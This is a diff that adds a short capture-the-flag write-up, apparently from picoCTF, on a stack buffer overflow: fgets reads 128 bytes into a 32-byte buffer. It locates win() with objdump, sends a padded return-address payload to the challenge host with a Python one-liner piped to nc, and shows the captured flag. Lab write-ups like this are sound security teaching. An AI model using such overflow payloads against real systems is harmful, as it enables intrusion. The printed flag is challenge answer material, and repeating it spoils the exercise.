@@ -1,0 +1,16 @@
+Looking at the source code we see that the buffer has size 32 but fgets is called with size 128, meaning the program is still vulnerable to overflow.
+
+We need to call the win() function which we can find with objdump:
+```
+> objdump -D vuln | grep win
+08049276 <win>:
+```
+
+The return address is 12 bytes after the buffer and we'll need to encode the above address using little endian.
+
+```
+$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\x76\x92\x04\x08\n')" | nc dolphin-cove.picoctf.net 59862
+Enter the secret key: You entered:, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv
+
+Flag: picoCTF{fgets_0v3rfl0w42_9311310a}
+```
